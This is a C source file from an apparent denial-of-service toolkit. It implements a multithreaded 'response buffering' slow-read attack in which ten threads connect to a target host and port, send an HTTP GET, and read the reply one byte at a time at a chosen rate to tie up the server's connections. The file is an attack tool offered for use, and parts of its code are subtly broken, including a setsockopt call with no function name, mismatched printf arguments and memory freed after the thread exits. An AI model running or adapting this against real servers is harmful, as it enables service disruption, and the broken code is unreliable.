#include "../header.h"
#include "../base/make_ipv4.h"
#include "../base/make_tcp.h"
#include "../base/receiver.h"
#include "../ddos/body_buffering.h"
#include "../base/subnet_mask.h"

unsigned int respbuffer_total;
unsigned int respbuffer_produced;
unsigned int respbuffer_received;

unsigned int respbuffer_per_second;
unsigned int respbuffer_duration;
double respbuffer_elapsed_time;

char respbuffer_dest_ip[16];
char respbuffer_src_ip[16];

int respbuffer_dest_port;

int respbuffer_src_ip_mask;
int respbuffer_dest_ip_mask;

char respbuffer_now_src_ip[16];
char respbuffer_now_dest_ip[16];

pthread_mutex_t respbuffer_mutex = PTHREAD_MUTEX_INITIALIZER;
pthread_cond_t respbuffer_cond = PTHREAD_COND_INITIALIZER;

struct timespec respbuffer_time1, respbuffer_time2;

char respbuffer_request[__BODY_BUFFERING_REQUEST_MSG_SIZE__ ];

int *respbuffer_sockets;
unsigned int respbuffer_wait_duration = 1.0;
clock_t *respbuffer_clocks;
unsigned int respbuffer_current;

void response_buffering_print_usage(int mode) {

	if (mode == 2)
		printf(
				"response buffering Usage : [Src-IP/mask] [Dest-IP/mask] [Dest-Port] [# requests/s]\n");
}

void* generate_response_buffering1(void *data) {
	int thread_id = *((int*) data);

	int first_run = 1;
	int sock = -1;
	while (1) {

		pthread_mutex_lock(&respbuffer_mutex);

		//making tcp connection

		if (first_run == 1) {
			sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
			int rvsz = 2;
			if ((sock, SOL_SOCKET, SO_RCVBUF, (const char*) &rvsz, sizeof(rvsz))
					== -1)
				perror("setsockopt failure.\n");

			//setsockopt(sock,IPPROTO_TCP,TCP_NODELAY,&tcpnod,sizeof(tcpnod));
			if (sock == -1)
				perror("sock creation failed\n");

			struct sockaddr_in servaddr;
			servaddr.sin_family = AF_INET;
			servaddr.sin_addr.s_addr = inet_addr(respbuffer_dest_ip);
			servaddr.sin_port = htons(respbuffer_dest_port);

			if (connect(sock, (struct sockaddr*) &servaddr, sizeof(servaddr))
					!= 0)
				perror("connect failed\n");

			/*sock = tcp_make_connection(inet_addr(respbuffer_src_ip),
			 inet_addr(respbuffer_dest_ip), respbuffer_src_port,
			 respbuffer_dest_port, SOCK_STREAM);
			 respbuffer_src_port ++;
			 first_run = 0;
			 printf("Sock : %d\n",sock);
			 */
			char http_request[] = "GET / HTTP/1.1\r\nHost: localhost\r\n\r\n";
			if ((send(sock, http_request, strlen(http_request), 0)) < 0) {
				perror("get send err\n");
			}
			printf("Get Sent\n");

			first_run = 0;
		}

		int recv_size = -9;
		char buffer[1];

		//Conditions begin.
		if (respbuffer_produced >= respbuffer_per_second) {
			pthread_cond_wait(&respbuffer_cond, &respbuffer_mutex);
		}

		//Get Time
		clock_gettime(CLOCK_MONOTONIC, &respbuffer_time2);
		double respbuffer_elapsed_time = (respbuffer_time2.tv_sec
				- respbuffer_time1.tv_sec)
				+ ((respbuffer_time2.tv_nsec - respbuffer_time1.tv_nsec)
						/ 1000000000.0);

		//If time > 1.0
		if (respbuffer_elapsed_time >= 1.0) {
			printf("-.\n");
			respbuffer_produced = 0;
			clock_gettime(CLOCK_MONOTONIC, &respbuffer_time1);
			pthread_cond_signal(&respbuffer_cond);
		}

		recv_size = read(sock, buffer, sizeof(buffer));



		respbuffer_produced++;
		respbuffer_total++;

		printf("%d recv :[%c]\n",respbuffer_produced, recv_size, buffer[0]);

		pthread_mutex_unlock(&respbuffer_mutex);

	}

	close(sock);
	return 0;

}

void* generate_response_buffering2(void *data) {
	/*int thread_id = *((int*) data);
	 clock_t thread_clock;

	 int sock;
	 while (1) {

	 pthread_mutex_lock(&respbuffer_mutex);
	 thread_clock = clock();
	 respbuffer_elapsed_time = ((double) (thread_clock
	 - respbuffer_global_elapsed_time)) / CLOCKS_PER_SEC;

	 if (respbuffer_elapsed_time >= respbuffer_duration) {
	 pthread_mutex_unlock(&respbuffer_mutex);
	 pthread_cond_broadcast(&respbuffer_cond);
	 respbuffer_timed_finisher = 1;
	 return 0;
	 }

	 if (respbuffer_produced >= respbuffer_per_second) {
	 pthread_cond_wait(&respbuffer_cond, &respbuffer_mutex);
	 }

	 int sock = tcp_make_connection(inet_addr(respbuffer_src_ip),
	 inet_addr(respbuffer_dest_ip), respbuffer_src_port,
	 respbuffer_dest_port, SOCK_PACKET);
	 respbuffer_src_port++;
	 if (respbuffer_src_port >= 65000)
	 respbuffer_src_port = 10000;

	 send(sock, respbuffer_request, __BODY_BUFFERING_REQUEST_MSG_SIZE__, 0);

	 respbuffer_produced++;
	 respbuffer_total++;
	 respbuffer_generated_count++;

	 pthread_cond_signal(&respbuffer_cond);
	 close(sock);
	 pthread_mutex_unlock(&respbuffer_mutex);

	 }

	 return 0;*/
}

void* respbuffer_time_check(void *data) {

	while (1) {
		pthread_mutex_lock(&respbuffer_mutex);
		clock_gettime(CLOCK_MONOTONIC, &respbuffer_time2);
		double respbuffer_elapsed_time = (respbuffer_time2.tv_sec
				- respbuffer_time1.tv_sec)
				+ ((respbuffer_time2.tv_nsec - respbuffer_time1.tv_nsec)
						/ 1000000000.0);

		//If time > 1.0
		if (respbuffer_elapsed_time >= 1.0) {
			printf("-.\n");
			respbuffer_produced = 0;
			clock_gettime(CLOCK_MONOTONIC, &respbuffer_time1);
			pthread_cond_signal(&respbuffer_cond);
		}

		pthread_mutex_unlock(&respbuffer_mutex);
	}
}

void response_buffering_run(char *argv[], int mode) {

	// TO BE FIXED LATER
	/*
	 FILE *get_f;

	 get_f = fopen("./src/ddos/http_request.txt", "rb");
	 if (get_f == NULL) {
	 perror("open error! does http_get_request.txt exist?\n");
	 exit(1);
	 }
	 char buffer[__BODY_BUFFERING_REQUEST_MSG_SIZE__ ];
	 while (fgets(buffer, __BODY_BUFFERING_REQUEST_MSG_SIZE__, get_f) != NULL) {
	 strcat(respbuffer_request, buffer);
	 strcat(respbuffer_request, "\r\n");
	 }
	 strcat(respbuffer_request, "\r\n");

	 printf("HTTP header msg:\n%s\n", respbuffer_request);
	 fclose(get_f);
	 */

	strcpy(respbuffer_request,
			"GET / HTTP/1.1\r\nHost: http://www.examplewebsitenotexisting.com\r\n");

	int argc = 0;

	respbuffer_produced = 0;

	while (argv[argc] != NULL) {
		argc++;
	}

	if (mode == 2 && argc != 4) {
		body_buffering_print_usage(mode);
		return;
	}

	respbuffer_produced = 0;

	get_ip_from_ip_addr(argv[0], respbuffer_src_ip);
	respbuffer_src_ip_mask = get_mask_from_ip_addr(argv[0]);
	strcpy(respbuffer_now_src_ip, respbuffer_src_ip);

	get_ip_from_ip_addr(argv[1], respbuffer_dest_ip);
	respbuffer_dest_ip_mask = get_mask_from_ip_addr(argv[1]);
	strcpy(respbuffer_now_dest_ip, respbuffer_dest_ip);

	if (mode == 2) {
		respbuffer_total = 0;
		respbuffer_per_second = atoi(argv[3]);

		if (respbuffer_per_second == 0)
			respbuffer_per_second = __UINT_MAXIMUM__;

		respbuffer_dest_port = atoi(argv[2]);
	}

	//Thread default 10.
	int num_threads = 10;

	int *generate_thread_id, *receive_thread_id;
	pthread_t *generate_thread, *receive_thread;
	generate_thread_id = (int*) malloc(sizeof(int) * (num_threads + 1));
	generate_thread = (pthread_t*) malloc(
			sizeof(pthread_t) * (num_threads + 1));

	int i;

	printf("Body Buffering attack to %s using %d threads\n", respbuffer_dest_ip,
			num_threads);
	for (i = 0; i < num_threads; i++)
		generate_thread_id[i] = i;

	for (i = 0; i < num_threads; i++) {
		if (mode == 1)
			pthread_create(&generate_thread[i], NULL,
					generate_response_buffering1,
					(void*) &generate_thread_id[i]);
		if (mode == 2) {
			printf("thread %d created\n", i);
			pthread_create(&generate_thread[i], NULL,
					generate_response_buffering1,
					(void*) &generate_thread_id[i]);
			/*RECEIVE THREAD DEACTIVATION*/
			//pthread_create(&receive_thread[i],NULL,receive_get,(void*)&receive_thread_id[i]);
		}

	}

	pthread_create(&generate_thread[i], NULL, respbuffer_time_check,
			(void*) &generate_thread_id[i]);
	num_threads++;

	for (i = 0; i < num_threads+1; i++) {
		void *status1, *status2;
		pthread_join(generate_thread[i], &status1);
		/*RECEIVE THREAD DEACTIVATION*/
		//pthread_join(receive_thread[i],&status2);
		printf("threads %d joined\n", i);
	}

	printf("Body Buffering attack finished.\n");

	pthread_mutex_destroy(&respbuffer_mutex);
	pthread_exit(NULL);

	free(generate_thread_id);
	free(generate_thread);

	return;
}
